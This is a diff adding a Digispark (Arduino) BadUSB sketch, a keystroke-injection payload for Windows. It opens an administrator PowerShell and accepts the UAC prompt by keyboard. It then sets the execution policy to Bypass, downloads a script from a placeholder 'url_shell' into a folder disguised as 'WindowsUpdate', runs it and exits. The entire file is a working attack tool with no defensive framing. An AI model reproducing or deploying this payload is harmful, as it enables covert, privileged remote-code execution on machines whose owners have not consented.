@@ -1,0 +1,37 @@
+#include "DigiKeyboard.h"
+void setup() {
+
+}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_A);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print(F("Set-ExecutionPolicy Bypass"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_A, MOD_ALT_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);  
+  DigiKeyboard.print(F("mkdir C:/Temp/WindowsUpdate"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);  
+  DigiKeyboard.delay(500);  
+  DigiKeyboard.print(F("$WebClient = New-Object System.Net.WebClient"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);  
+  DigiKeyboard.delay(100);  
+  DigiKeyboard.print(F("$WebClient.DownloadFile('url_shell','C:/Temp/WindowsUpdate/start.ps1')"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);  
+  DigiKeyboard.delay(1000);  
+  DigiKeyboard.print(F("C:/Temp/WindowsUpdate/start.ps1"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);  
+  DigiKeyboard.delay(500);  
+  DigiKeyboard.print(F("exit"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);  
+  for(;;){}
+}
